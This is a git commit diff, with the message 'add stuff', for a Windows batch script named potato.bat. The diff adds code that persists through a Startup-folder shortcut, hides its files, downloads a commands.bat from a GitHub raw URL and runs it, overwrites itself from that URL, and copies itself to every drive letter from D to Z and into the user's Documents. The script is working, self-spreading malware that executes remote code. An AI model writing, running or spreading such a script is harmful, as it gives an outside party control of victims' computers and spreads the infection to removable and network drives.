86f1e027b47b81c7daad7c742550a1f4b383018b
romort2 <rupertlikesshortwaves@proton.me>
2024-12-12 13:12:42 +0530

    add stuff

--- potato.bat
+++ potato.bat
@@ -1,13 +1,27 @@
 @echo off
 echo %~nx0
 :: Copy to startup
-:: (FAILED)
-:: robocopy %~nx0 "C:\Users\thoihenba\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" /E
 powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%userprofile%\Start Menu\Programs\Startup\%~n0.lnk');$s.TargetPath='%~f0';$s.Save()"
 mkdir system2
 attrib +h system2
 cd system2
-curl https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > commands.bat
+:: get commands
+curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > commands.bat
+
+
+
 call commands.bat
 attrib +h %~nx0
+
+if %~d0=="C:" (
+:: get auto updates
+curl --ssl-no-revoke https://raw.githubusercontent.com/romort2/potato11/refs/heads/main/c > potato.bat
 for %%i in (D E F G H I J K L M N O P Q R S T U V W X Y Z) DO @if exist %%i: xcopy /s /h /y %0 %%i:
+
+)
+
+if not %~dp0 =="C:\" (
+copy %0 %UserProfile%\Documents
+
+)
+call commands.bat
